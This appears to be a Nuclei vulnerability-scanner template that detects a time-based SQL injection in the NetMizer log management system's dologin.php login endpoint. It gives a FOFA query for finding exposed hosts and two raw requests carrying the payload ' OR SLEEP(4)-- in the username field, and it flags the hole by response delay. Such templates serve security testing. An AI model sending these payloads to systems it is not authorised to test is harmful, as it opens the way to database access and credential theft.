id: NetMizer-dologin_php-sql-time-XVE-2024-37672

info:
  name: "NetMizer 接口 SQL 注入漏洞 (XVE-2024-37672)"
  author: Unknown
  severity: high
  description: |-
    fofa: app="NetMizer-日志管理系统"
      该漏洞位于NetMizer日志管理系统/dologin.php接口的输入验证逻辑中，攻击者可通过构造恶意SQL语句实现数据库层级的未授权访问。此漏洞允许提取敏感数据（包括但不限于管理员身份验证凭据、用户隐私信息）以及在具备操作系统写入权限的情况下部署恶意负载，最终可能导致对目标服务器的完全控制。
  reference:
  - https://mp.weixin.qq.com/s/BuMyDDxwfAiZCGQfPuGayQ
  tags: NetMizer

http:
- raw:
  - |
    POST /data/login/dologin.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    action=login&username=' OR SLEEP(4)-- qAZp&passwd=1

  - |
    POST /data/login/dologin.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    action=login&username=' OR SLEEP(8)-- qAZp&passwd=1
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
